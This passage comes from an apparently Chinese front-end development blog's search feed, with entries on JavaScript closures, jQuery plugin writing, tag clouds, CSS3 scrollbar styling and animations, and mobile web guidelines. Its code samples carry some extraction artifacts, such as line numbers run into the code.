/*IE6*/*+html .header&#123;&#125; /*IE7*/]]></content>
      <categories>
        <category>前端兼容</category>
      </categories>
      <tags>
        <tag>浏览器的兼容</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[闭包及其应用]]></title>
    <url>%2F2015%2F07%2F17%2F%E9%97%AD%E5%8C%85%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8%2F</url>
    <content type="text"><![CDATA[一. 闭包的理论首先必须了解以下几个概念：执行环境&emsp;&emsp;每调用一个函数时（执行函数时），系统会为该函数创建一个==封闭的局部的运行环境==，即该函数的执行环境。函数总是在自己的执行环境中执行，如读写局部变量、函数参数、运行内部逻辑。创建执行环境的过程包含了创建函数的作用域，函数也是在自己的作用域下执行的。从另一个角度说，每个函数执行环境都有一个作用域链，子函数的作用域链包括它的父函数的作用域链。关于作用域、作用域链请看下面。作用域、作用域链、调用对象函数作用域分为词法作用域和动态作用域。&emsp;&emsp;==词法作用域==是函数定义时的作用域，即静态作用域。当一个函数定义时，他的词法作用域就确定了，词法作用域说明的是在函数结构的嵌套关系下，函数作用的范围。这个时候也就形成了该函数的作用域链。作用域链就是把这些具有嵌套层级关系的作用域串联起来。函数的内部[[scope]]属性指向了该作用域链。&emsp;&emsp;==动态作用域==是函数调用执行时的作用域。当一个函数被调用时，首先将函数内部[[scope]]属性指向了函数的作用域链，然后会创建一个==调用对象==，并用该调用对象记录函数参数和函数的局部变量，将其置于作用域链顶部。动态作用域就是通过把该调用对象加到作用域链的顶部来创建的，此时的[[scope]]除了具有定义时的作用域链，还具有了调用时创建的调用对象。换句话说，执行环境下的作用域等于该函数定义时就确定的作用域链加上该函数刚刚创建的调用对象，从而也形成了新的作用域链。所以说是动态的作用域，并且作用域链也随之发生了变化。再看这里的作用域，其实是一个对象链，这些对象就是函数调用时创建的调用对象，以及他上面一层层的调用对象直到最上层的全局对象。&emsp;&emsp;譬如全局环境下的函数A内嵌套了一个函数B，则该函数B的作用域链就是：函数B的作用域—&gt;函数A的作用域—&gt;全局window的作用域。++当函数B调用时，寻找某标识符，会按函数B的作用域—&gt;函数A的作用域—&gt;全局window的作用域去寻找，实际上是按函数B的调用对象—&gt;函数A的调用对象—&gt;全局对象这个顺序去寻找的++。也就是说当函数调用时，函数的作用域链实际上是调用对象链。闭包&emsp;&emsp;在动态执行环境中，数据实时地发生变化，==为了保持这些非持久型变量的值==，我们用闭包这种载体来存储这些动态数据（看完下面的应用就会很好的体会这句话）。闭包的定义：所谓“闭包”，指的是一个拥有许多变量和绑定了这些变量的环境的表达式（通常是一个函数），因而这些变量也是该表达式的一部分。&emsp;&emsp;闭包就是嵌套在函数里面的内部函数，并且该内部函数可以访问外部函数中声明的所有局部变量、参数和其他内部函数。当该内部函数在外部函数外被调用，就生成了闭包。（实际上任何函数都是全局作用域的内部函数，都能访问全局变量，所以都是window的闭包）譬如下面这个例子：12345678910111213&lt;script type="text/javascript"&gt;function f(x) &#123;var a = 0;a++;x++;var inner = function() &#123;return a + x;&#125;return inner;&#125;var test = f(1);alert(test());&lt;/script&gt;==垃圾回收机制：如果某个对象不再被引用，该对象将被回收。==&emsp;&emsp;再结合前面所讲的一些概念，在执行var test=f(1)时创建了f的调用对象，这里暂且记作obj，执行完后虽然退出了外部执行环境，但内部函数inner被外部函数f外面的一个变量test引用。&emsp;&emsp;由于外部函数创建的调用对象obj有一个属性指向此内部函数，而现在这个内部函数又被引用，所以调用对象obj会继续存在，不会被垃圾回收器回收，其函数参数x和局部变量a都会在这个调用对象中得以维持。虽然调用对象不能被直接访问，但是该调用对象已成为内部函数作用域链中的一部分，可以被内部函数访问并修改，所以执行test()时，可以正确访问x和a。所以说， 当执行了外部函数时，生成了闭包，被引用的外部函数的变量将继续存在。二. 闭包的应用应用1：这个是我在用js模拟排序算法过程遇到的问题。我要输出每一次插入排序后的数组，如果在循环中写成1setTimeout(function() &#123; $("proc").innerHTML += arr + "&lt;br/&gt;"; &#125;, i * 500);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;会发现每次输出的都是最终排好序的数组，因为arr数组不会为你保留每次排序的状态值。为了保存会不断发生变化的数组值，我们用外面包裹一层函数来实现闭包，用闭包存储这个动态数据。下面用了2种方式实现闭包，一种是用参数存储数组的值，一种是用临时变量存储，后者必须要深拷贝。所有要通过闭包存储非持久型变量，均可以用临时变量或参数两种方式实现。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;&lt;head&gt;&lt;title&gt;&lt;/title&gt;&lt;script type="text/javascript"&gt;var arr = [4, 5, 6, 8, 7, 9, 3, 2, 1, 0];var $ = function(id) &#123; return document.getElementById(id); &#125;var Sort = &#123;Insert: function() &#123;for (var i = 1; i &lt; arr.length; i++) &#123;for (var j = 0; j &lt; i; j++) &#123;if (arr[i] &lt; arr[j]) &#123;arr[i] = [arr[j], arr[j] = arr[i]][0];&#125;&#125;setTimeout((function() &#123;var m = [];for (var j = 0; j &lt; arr.length; j++) &#123;m[j] = arr[j];&#125;return function() &#123;$("proc").innerHTML += m + "&lt;br /&gt;";&#125;&#125;)(), i * 500);//or 写成下面这样也可以/*setTimeout((function(m) &#123;return function() &#123;$("proc").innerHTML += m + "&lt;br /&gt;";&#125;&#125;)(arr.join(",")), i * 500);*/&#125;return arr;&#125;&#125;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div&gt;var a = [4, 5, 6, 8, 7, 9, 3, 2, 1, 0];&lt;/div&gt;&lt;div&gt;&lt;input type="button" value="插入排序" onclick="Sort.Insert();" /&gt;&lt;/div&gt;Proc:&lt;br /&gt;&lt;div id="proc"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;应用2：为每个结点绑定click事件弹出循环的索引值。起初写成12345id.onclick = function()&#123;alert(i);&#125;id.onclick = function()&#123;alert(i);&#125;发现最终弹出的都是4，而不是想要的 1、2、3，因为循环完毕后i值变成了4。为了保存i的值，同样我们用闭包实现：12345678910111213141516171819202122232425&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;&lt;head&gt;&lt;title&gt;&lt;/title&gt;&lt;script type="text/javascript"&gt;window.onload = function() &#123;for (var i = 1; i &lt; 4; i++) &#123;var id = document.getElementById("a" + i);id.onclick = (function(i) &#123;return function() &#123;alert(i);&#125;&#125;)(i);&#125;&#125;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;ul&gt;&lt;li id="a1"&gt;aa&lt;/li&gt;&lt;li id="a2"&gt;aa&lt;/li&gt;&lt;li id="a3"&gt;aa&lt;/li&gt;&lt;/ul&gt;&lt;/body&gt;&lt;/html&gt;应用3：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;下面的code是缓存的应用，catchNameArr。在匿名函数的调用对象中保存catch的值，返回的对象由于被CachedBox变量引用导致匿名函数的调用对象不会被回收，从而保持了catch的值。可以通过CachedBox.getCatch(“regionId”);来操作，若找不到regionId则从后台取，catchNameArr 主要是为了防止缓存过大。12345678910111213141516171819202122&lt;script type="text/javascript"&gt;var CachedBox = (function() &#123;var cache = &#123;&#125;, catchNameArr = [], catchMax = 10000;return &#123;getCatch: function(name) &#123;if (name in cache) &#123;return cache[name];&#125;var value = GetDataFromBackend();cache[name] = value;catchNameArr.push(name);this.clearOldCatch();return value;&#125;,clearOldCatch: function() &#123;if (catchNameArr.length &gt; catchMax) &#123;delete cache[catchNameArr.shift()];&#125;&#125;&#125;;&#125;)();&lt;/script&gt;同理，也可以用这种思想实现自增长的ID。12345678910&lt;script type="text/javascript"&gt;var GetId = (function() &#123;var id = 0;return function() &#123;return id++;&#125;&#125;)();var newId1 = GetId();var newId2 = GetId();&lt;/script&gt;应用4：用闭包实现程序的暂停执行功能，还蛮创意的。1234567891011&lt;input type="button" value="继续" onclick='st();'/&gt;&lt;script type="text/javascript"&gt;var st = (function() &#123;alert(1);alert(2);return function() &#123;alert(3);alert(4);&#125;&#125;)();&lt;/script&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;看了上面的这些应用，再回到前面的一句话：在动态执行环境中，数据实时地发生变化，为了保持这些非持久型变量的值，我们用闭包这种载体来存储这些动态数据。这就是闭包的作用。也就说遇到需要存储动态变化的数据或将被回收的数据时，我们可以通过外面再包裹一层函数形成闭包来解决。当然，闭包会导致很多外部函数的调用对象不能释放，滥用闭包会使得内存泄露，所以在频繁生成闭包的情景下我们要估计下他带来的副作用。]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>闭包</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[手把手教你怎么写jQuery插件]]></title>
    <url>%2F2015%2F07%2F17%2F%E6%89%8B%E6%8A%8A%E6%89%8B%E6%95%99%E4%BD%A0%E6%80%8E%E4%B9%88%E5%86%99jquery%E6%8F%92%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;jQuery（以下简称JQ）是一个功能强大而又小巧的JS框架，现在很多网站都在使用JQ，本站也不例外。本文教大家如何写一个属于你自己的JQ插件。&emsp;&emsp;本JQ插件例子是在你网站的文章结尾处添加你的版权。JQ插件标准的封装代码如下，首先需要闭包：12345&lt;script type="text/javascript"&gt;(function($)&#123;//这里放入插件代码&#125;)(jQuery);&lt;/script&gt;这是jQuery官方的插件开发规范，这样写是作用是：1. 避免全局依赖。2. 避免第三方破坏。3. 兼容jQuery操作符’$’和’jQuery’接着给插件加入主体：1234567891011121314151617&lt;script type="text/javascript"&gt;(function($)&#123;$.fn.userCp=function(options)&#123; //定义插件的名称，这里为userCpvar dft=&#123;//以下为该插件的属性及其默认值cpBy: "web前沿", //版权所有者url: "http://www.js7e.com", //所有者链接size: "12px", //版权文字大小align: "left" //版权文字位置，left || center || right&#125;;var ops = $.extend(dft,options);var style = 'style="font-size:' + ops.size + ';text-align:' + ops.align + ';"'; //调用默认的样式var cpTxt = '&lt;p' + ' ' + style + '&gt;此文章版权归&lt;a target="_blank" href="' + ops.url + '"&gt;' + ops.cpBy + '&lt;/a&gt;所有&lt;/p&gt;'; //生成版权文字的代码$(this).append(cpTxt); //把版权文字加入到想显示的div&#125;&#125;)(jQuery);&lt;/script&gt;&nbsp;&emsp;&emsp;OK了，这个插件已经完成了，接下来我们来看看调用的方式。比如你文章所在的div的id=”article-content”，那么在此div后面（先读取到了该div，该div才可以作为后面的JS的对象）加上JS代码：123&lt;script type="text/javascript"&gt;$("#article-content").userCp();&lt;/script&gt;&emsp;&emsp;其实也不是一定要放到该div的后面，比如要放到head区域里的话，就要使用JQ的预读功能，也就是把页面所有的dom都读取完之后，才执行里面的JS：123456&lt;script type="text/javascript"&gt;$(function()&#123;//官方解释：在dom文档载入完成后执行的函数$("#article-content").userCp();&#125;);&lt;/script&gt;&emsp;&emsp;如果不想使用默认的内容，比如要修改版权所有者名字、网址、文字大小和靠右显示等，那就给这个插件传几个参数：12345678&lt;script type="text/javascript"&gt;$("#article-content").userCp(&#123;cpBy: " T ",url: "http://js7e.com",size: "16px",align: "right"&#125;);&lt;/script&gt;&emsp;&emsp;在实际的应用中，我们当然不会写这么一个插件，因为直接用非封装的方法或者直接改页面的源码会更快更方便，我只是为了给大家一个demo，所以才写了这个鸡肋的插件。不会JS的同学，可以直接去学JQ，这样让你在短时间内能够做出很炫的效果，而不必去啃那些厚厚的JS书籍了。不过如果你是想以JS作为职业的话，还是要从最基本的东西学起。]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>写jquery插件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javascript实现标签云]]></title>
    <url>%2F2015%2F07%2F16%2Fjavascript%E5%AE%9E%E7%8E%B0%E6%A0%87%E7%AD%BE%E4%BA%91%2F</url>
    <content type="text"><![CDATA[这是一个效果图原理：随机取色，随机字体大小实现：1、随机方法：123function rand(num)&#123;return parseInt(Math.random()*num+1);&#125;2、随机取色：1234567function randomcolor()&#123;var str=Math.ceil(Math.random()*16777215).toString(16);if(str.length&lt;6)&#123;str=“0”+str;&#125;return str;&#125;3、循环dom123456789101112131415for (len = obj.length, i = len; i–;) &#123; obj[i].style.left = rand(600) + ”px”; obj[i].style.top = rand(400) + ”px”; obj[i].className = “color” + rand(5); obj[i].style.zIndex = rand(5); obj[i].style.fontSize = rand(12) + 12 + ”px”; // obj[i].style.background=“#”+randomcolor(); obj[i].style.color = “#” + randomcolor(); obj[i].onmouseover = function() &#123; this.style.background = “#” + randomcolor(); &#125; obj[i].onmouseout = function() &#123; this.style.background = “none”; &#125;&#125;4、dom结构1234567891011&lt;div id=“wrap”&gt;&lt;a href=“#”&gt;web标准学习&lt;/a&gt;&lt;a href=“#”&gt;css&lt;/a&gt;&lt;a href=“#”&gt;javascript&lt;/a&gt;&lt;a href=“#”&gt;html5&lt;/a&gt;&lt;a href=“#”&gt;canvas&lt;/a&gt;&lt;a href=“#”&gt;video&lt;/a&gt;&lt;a href=“#”&gt;audio&lt;/a&gt;&lt;a href=“#”&gt;jQuery&lt;/a&gt;&lt;a href=“#”&gt;jQuerymobile&lt;/a&gt;&lt;a href=“#”&gt;flash&lt;/a&gt;&lt;a href=“#”&gt;firefox&lt;/a&gt;&lt;a href=“#”&gt;chrome&lt;/a&gt;&lt;a href=“#”&gt;opera&lt;/a&gt;&lt;a href=“#”&gt;IE9&lt;/a&gt;&lt;a href=“#”&gt;css3.0&lt;/a&gt;&lt;a href=“#”&gt;andriod&lt;/a&gt;&lt;a href=“#”&gt;apple&lt;/a&gt;&lt;a href=“#”&gt;google&lt;/a&gt;&lt;a href=“#”&gt;jobs&lt;/a&gt;&lt;/div&gt;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>js标签云</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSS3自定义滚动条样式 -webkit-scrollbar]]></title>
    <url>%2F2015%2F07%2F16%2Fcss3%E8%87%AA%E5%AE%9A%E4%B9%89%E6%BB%9A%E5%8A%A8%E6%9D%A1%E6%A0%B7%E5%BC%8F-webkit-scrollbar%2F</url>
    <content type="text"><![CDATA[有没有觉得浏览器自带的原始滚动条很不美观，同时也有看到很多网站的自定义滚动条显得高端，就连chrome32.0开发板都抛弃了原始的滚动条，美观多了。那webkit浏览器是如何自定义滚动条的呢？前言webkit支持拥有overflow属性的区域，列表框，下拉菜单，textarea的滚动条自定义样式，所以用处还是挺大的。当然，兼容所有浏览器的滚动条样式目前是不存在的。演示来看看这2个滚动条demo： demo1（图片版）、demo2（纯CSS3版）滚动条组成::-webkit-scrollbar 滚动条整体部分::-webkit-scrollbar-thumb 滚动条里面的小方块，能向上向下移动（或往左往右移动，取决于是垂直滚动条还是水平滚动条）::-webkit-scrollbar-track 滚动条的轨道（里面装有Thumb）::-webkit-scrollbar-button 滚动条的轨道的两端按钮，允许通过点击微调小方块的位置。::-webkit-scrollbar-track-piece 内层轨道，滚动条中间部分（除去）::-webkit-scrollbar-corner 边角，即两个滚动条的交汇处::-webkit-resizer 两个滚动条的交汇处上用于通过拖动调整元素大小的小控件简洁版这里就不贴出详细代码了，demo里面可以通过查看源码寻找具体样式的设置。来看看demo2中第二个滚动条的样式1234567891011121314151617181920212223/*定义滚动条高宽及背景 高宽分别对应横竖滚动条的尺寸*/::-webkit-scrollbar&#123;width: 16px;height: 16px;background-color: #F5F5F5;&#125;/*定义滚动条轨道 内阴影+圆角*/::-webkit-scrollbar-track&#123;-webkit-box-shadow: inset 0 0 6px rgba(0,0,0,0.3);border-radius: 10px;background-color: #F5F5F5;&#125;/*定义滑块 内阴影+圆角*/::-webkit-scrollbar-thumb&#123;border-radius: 10px;-webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);background-color: #555;&#125;详细设置定义滚动条就是利用伪元素与伪类，那什么是伪元素和伪类呢？伪类大家应该很熟悉:link,:focus,:hover，此外CSS3中又增加了许多伪类选择器，如:nth-child，:last-child，:nth-last-of-type()等。CSS中的伪元素大家以前看过：:first-line,:first-letter,:before,:after。那么在CSS3中，伪元素进行了调整，在以前的基础上增加了一个“：”也就是现在变成了“::first-letter,::first-line,::before,::after”，另外CSS3还增加了一个“::selection”。两个“：：”和一个“：”在css3中主要用来区分伪类和伪元素。webkit的伪类和伪元素的实现很强，可以把滚动条当成一个页面元素来定义，再结合一些高级的CSS3属性，比如渐变、圆角、RGBa等等。然后如果有些地方要用图片，可以把图片也可以转换成Base64，不然每次都得加载那个多个图片，增加请求数。任何对象都可以设置：边框、阴影、背景图片等等，创建的滚动条任然会按照操作系统本身的设置来完成其交互的行为。下面的伪类可以应用到上面的伪元素中。有点小复杂，具体怎么写可以看第一个demo，那里也有注释。:horizontal//horizontal伪类适用于任何水平方向上的滚动条:vertical//vertical伪类适用于任何垂直方向的滚动条:decrement//decrement伪类适用于按钮和轨道碎片。表示递减的按钮或轨道碎片，例如可以使区域向上或者向右移动的区域和按钮:increment//increment伪类适用于按钮和轨道碎片。表示递增的按钮或轨道碎片，例如可以使区域向下或者向左移动的区域和按钮:start//start伪类适用于按钮和轨道碎片。表示对象（按钮 轨道碎片）是否放在滑块的前面:end//end伪类适用于按钮和轨道碎片。表示对象（按钮 轨道碎片）是否放在滑块的后面:double-button//double-button伪类适用于按钮和轨道碎片。判断轨道结束的位置是否是一对按钮。也就是轨道碎片紧挨着一对在一起的按钮。:single-button//single-button伪类适用于按钮和轨道碎片。判断轨道结束的位置是否是一个按钮。也就是轨道碎片紧挨着一个单独的按钮。:no-button//no-button伪类表示轨道结束的位置没有按钮。:corner-present//corner-present伪类表示滚动条的角落是否存在。:window-inactive//适用于所有滚动条，表示包含滚动条的区域，焦点不在该窗口的时候。1234567891011::-webkit-scrollbar-track-piece:start &#123;/*滚动条上半边或左半边*/&#125;::-webkit-scrollbar-thumb:window-inactive &#123;/*当焦点不在当前区域滑块的状态*/&#125;::-webkit-scrollbar-button:horizontal:decrement:hover &#123;/*当鼠标在水平滚动条下面的按钮上的状态*/&#125;]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>-webkit-scrollbar</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[为网站增加js网页雪花飘落效果jquery插件]]></title>
    <url>%2F2015%2F07%2F16%2F%E4%B8%BA%E7%BD%91%E7%AB%99%E5%A2%9E%E5%8A%A0js%E7%BD%91%E9%A1%B5%E9%9B%AA%E8%8A%B1%E9%A3%98%E8%90%BD%E6%95%88%E6%9E%9Cjquery%E6%8F%92%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[代码说明:&emsp;&emsp;圣诞、元旦、新年了为网站增加js网页雪花飘落特殊效果jquery插件，特别适合圣诞、元旦、新年网站气氛烘托。&emsp;&emsp;这个js网页雪花效果jquery插件，只需要将 jq.snow.js 引入到你的网站，当然你的网站必须已经引用了jquery库，如果没有那你要想要引入jquery库才可以,建议把js网页雪花飘落特效文件在网站的body标签的前面引用，这样做的好处是这个特效的将在最后加载不影响贵网站主要内容的快速展示。js网页雪花效果jquery插件插件参数说明：123minSize: 5, //飘落雪花的最小尺寸maxSize: 50, //飘落雪花的最大尺寸newOn: 1000 //飘落雪花出现的频率 这个数值越小雪花越多演示效果点此下载]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>js雪花飘落</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[css3动画简介以及动画库animate.css的使用]]></title>
    <url>%2F2015%2F07%2F16%2Fcss3%E5%8A%A8%E7%94%BB%E7%AE%80%E4%BB%8B%E4%BB%A5%E5%8F%8A%E5%8A%A8%E7%94%BB%E5%BA%93animate-css%E7%9A%84%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[在这个年代，你要是不懂一点点css3的知识，你都不好意思说你是个美工。美你妹啊，请叫我前端工程师好不好。呃。。好吧，攻城尸。。。呵呵，作为一个攻城尸，没有点高端大气上档次的东西怎么能行呢，那么css3的动画就绝对是值得你拥有了，虽说IE9以及更早版本的IE浏览器都不支持css3动画，但是IE6-8浏览器已是江河日下，使用谷歌浏览器、火狐浏览器、IE10+浏览器以及移动端浏览器等这些支持css3动画的浏览器的人数越来越多，所以如果很简单的就能让一部分人获得更好的用户体验，那何乐而不为呢。从广义上来讲，css3动画可以分为两种。&nbsp;过渡动画第一种叫过渡（transition）动画，就是从初始状态过渡到结束状态这个过程中所产生的动画。所谓的状态就是指大小、位置、颜色、变形（transform）等等这些属性。css过渡只能定义首和尾两个状态，所以是最简单的一种动画。要想使一个元素产生过渡动画，首先要在这个元素上用transition属性定义动画的各种参数。可定义的参数有transition-property：规定对哪个属性进行过渡transition-duration：定义过渡的时间，默认是0transition-timing-function：定义过渡动画的缓动效果，如淡入、淡出等，默认是 easetransition-delay：规定过渡效果的延迟时间，即在过了这个时间后才开始动画，默认是0为了书写方便，也可以把这四个属性按照以上顺序简写在一个 transition 属性上：如果是使属性的默认值，则可以省略：相当于：如果想要同时过渡多个属性，可以用逗号隔开，如：使用transtion属性只是规定了要如何去过渡，要想让动画发生，还得要有元素状态的改变。如何改变元素状态呢，当然就是在css中给这个元素定义一个类（:hover等伪类也可以），这个类描述的是过渡动画结束时元素的状态。这样，当我们把鼠标移动到div上的时候，div的状态发生了变化，就能看到宽度从100到400，高度从100到400，背景颜色从黑到红的，过渡时间为3秒的过渡效果了。除了使用hover等系统提供的伪类外，我们也可以随意的定义自己的类，然后想要过渡时就通过js把类加到元素上面：&nbsp;关键帧动画第二种叫做关键帧（keyframes）动画。不同于第一种的过渡动画只能定义首尾两个状态，关键帧动画可以定义多个状态，或者用关键帧来说的话，过渡动画只能定义第一帧和最后一帧这两个关键帧，而关键帧动画则可以定义任意多的关键帧，因而能实现更复杂的动画效果。关键帧动画的定义方式也比较特殊，它使用了一个关键字 @keyframes 来定义动画。具体格式为：@keyframes 动画名称{时间点 {元素状态}时间点 {元素状态}…}例如：这段代码定义了一个名为demo,且有5个关键帧的动画。0% ，10% 等这些表示的是时间点，是相对于整个动画的持续时间来说的，时间点之后的花括号里则是元素的状态属性集合，描述了这个元素在这个时间点的状态，动画发生时，就是从第一个状态到第二个状态进行过渡，然后从第二个状态到第三个状态进行过渡，直到最后一个状态。一般来说，0%和100%这两个关键帧是必须要定义的。关键帧的书写方式很灵活，一行可以写多个关键帧。甚至它们之间的空格也是可以不要的。现在我们知道了怎么去定义一个关键帧动画了，那怎么去实现这个动画呢？其实很简单，只要把这个动画绑定到某个要进行动画的元素上就行了。把动画绑定到元素上，我们可以使用animation属性。animation属性有以下这些：像前面讲的transition属性一样，也可以把这些animation属性简写到一个animation中，使用默认值的也可以省略掉。但 animation-play-state 属性不能简写到animation中。只要像这样把定义好的动画绑定到元素上，就能实现关键帧动画了，而不是像第一种过渡动画那样，需要一个状态的改变才能触发动画。注意，为了达到最佳的浏览器兼容效果，在实际书写代码的时候，还必须加上各大浏览器的私有前缀animate.css的使用animate.css是一个css3动画库，可以到github上去下载，里面预设了很多种常用的动画，可以先在本页看下演示效果，使用也很简单，因为它是把不同的动画绑定到了不同的类里，所以我们想要使用哪种动画的时候，只需要简单的把那个相应的类添加到元素上就行了：首先在head中引入下载的animate.css文件然后你想要哪个元素进行动画，就给那个元素添加上animated类 以及特定的动画类名，animated是每个要进行动画的元素都必须要添加的类。假设使用jquery，要给一个id为demo的元素添加一个摇动的动画,因为摇动的动画类名为shake，所以代码是这样的：这样载入页面，元素就能动起来了。你也可以在动画完成后，把动画类移除，以便可以再次进行同一个动画。至于动画的配置参数，比如动画持续时间，动画的执行次数等等，你可以在你的的元素上自行定义，覆盖掉animate.css里面所定义的就行了。注意这些属性还要记得加上各浏览器的前缀。总之是很灵活的，说到底不就是一个css文件吗，一看就懂的，你在里面想怎么整就怎么整，不想用它提供的类名，就在里面改掉就行了。如果你只想用里面的部分动画，也可以把那些要使用的动画分离出来，它的官网也提供了这样的功能。&nbsp;下面展示了animate.css里面提供的所有动画，动画名就是类名，你想使用哪个动画，加上这个类名就行了。]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>animate.css</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[腾讯移动web开发规范]]></title>
    <url>%2F2015%2F07%2F16%2F%E8%85%BE%E8%AE%AF%E7%A7%BB%E5%8A%A8web%E5%BC%80%E5%8F%91%E8%A7%84%E8%8C%83%2F</url>
    <content type="text"><![CDATA[移动开发规范概述&emsp;&emsp;以下规范建议，均是Alloyteam在日常开发过程中总结提炼出的经验，规范具备较好的项目实践，强烈推荐使用字体设置使用无衬线字体123body &#123;font-family: "Helvetica Neue", Helvetica, STHeiTi, sans-serif;&#125;&emsp;&emsp;iOS 4.0+ 使用英文字体 Helvetica Neue，之前的iOS版本降级使用 Helvetica。中文字体设置为华文黑体STHeiTi。 需补充说明，华文黑体并不存在iOS的字体库中(http://support.apple.com/kb/HT5484?viewlocale=en_US)， 但系统会自动将华文黑体STHeiTi兼容命中系统默认中文字体黑体-简或黑体-繁原生Android下中文字体与英文字体都选择默认的无衬线字体；4.0 之前版本英文字体原生 Android 使用的是 Droid Sans，中文字体原生 Android 会命中 Droid Sans Fallback4.0 之后中英文字体都会使用原生 Android 新的 Roboto 字体其他第三方 Android 系统也一致选择默认的无衬线字体基础交互设置全局的CSS样式，避免图中的长按弹出菜单与选中文本的行为1234567a, img &#123;-webkit-touch-callout: none; /* 禁止长按链接与图片弹出菜单 */&#125;html, body &#123;-webkit-user-select: none; /* 禁止选中文本（如无文本选中需求，此为必选项） */user-select: none;&#125;移动性能要考虑Android低端机与2G网络场景下性能发布前必要检查项所有图片必须有进行过压缩考虑适度的有损压缩，如转化为80%质量的jpg图片考虑把大图切成多张小图，常见在banner图过大的场景加载性能优化, 达到打开足够快数据离线化，考虑将数据缓存在 localStorage初始请求资源数注意！图片使用CSS Sprites 或 DATAURI外链 CSS 中避免 @import 引入考虑内嵌小型的静态资源内容初始请求资源gzip后总体积 &lt; 50kb静态资源(HTML/CSS/JS/IMAGE)是否优化压缩？避免打包大型类库确保接入层已开启Gzip压缩尽量使用CSS3代替图片初始首屏之外的图片资源需延迟加载 注意！单页面应用(SPA)考虑延迟加载非首屏业务模块运行性能优化, 达到操作足够流畅避免 iOS 300+ms 点击延时问题 注意！缓存 DOM 选择与计算避免触发页面重绘的操作Debounce连续触发的事件(scroll/resize)，避免高频繁触发执行尽可能使用事件代理，避免批量绑定事件使用CSS3动画代替JS动画避免在低端机上使用大量CSS3渐变阴影效果，可考虑降级效果来提升流畅度HTML结构层级保持足够简单，推荐不超过 5 个层级尽能少的使用CSS高级选择器与通配选择器Keep it simple在线性能检测评定工具使用指南访问 Google PageSpeed 在线评定网站在地址栏输入目标URL地址，点击分析按钮开始检测按 PageSpeed 分析出的建议进行优化，优先解决红色类别的问题]]></content>
      <categories>
        <category>移动前端</category>
      </categories>
      <tags>
        <tag>腾讯移动</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[分享我的HTML模板页面]]></title>
    <url>%2F2015%2F07%2F16%2F%E5%88%86%E4%BA%AB%E6%88%91%E7%9A%84html%E6%A8%A1%E6%9D%BF%E9%A1%B5%E9%9D%A2%2F</url>
    <content type="text"><![CDATA[12345678910111213141516171819202122232425&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt; &lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8"&gt; &lt;title&gt;首页&lt;/title&gt; &lt;meta name="keywords" content=""/&gt; &lt;meta name="description" content=""/&gt; &lt;meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"&gt; &lt;link rel="stylesheet" href="css/reset.css"/&gt; &lt;link rel="stylesheet" href="css/reset.css"/&gt; &lt;!--[if lt IE 9]&gt; &lt;script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"&gt;&lt;/script&gt; &lt;script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"&gt;&lt;/script&gt; &lt;![endif]--&gt; &lt;!--[if IE]&gt; &lt;link rel="stylesheet" href="css/ie.css" /&gt; &lt;script src="js/html5.js"&gt;&lt;/script&gt; &lt;![endif]--&gt;&lt;/head&gt;&lt;body&gt; &lt;script src="js/jquery.js"&gt;&lt;/script&gt; &lt;script src="js/common.js"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;用到文件说明reset.css：样式重置，以及一些固定的样式style.css：主CSS文件，一般放到所有调用的CSS的最后一个，如果你用到其他框架CSS，则把style.css放到最后ie.css：兼容IE下的问题（这个实际问题实际写了）html5.js的：百度搜下即可（让IE低版本兼容HTML5元素）jquery.js：不解释了common.js：这里是公用的js，一般头部导航等]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>HTML模板</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[移动端中判断横屏竖屏]]></title>
    <url>%2F2015%2F07%2F16%2F%E7%A7%BB%E5%8A%A8%E7%AB%AF%E4%B8%AD%E5%88%A4%E6%96%AD%E6%A8%AA%E5%B1%8F%E7%AB%96%E5%B1%8F%2F</url>
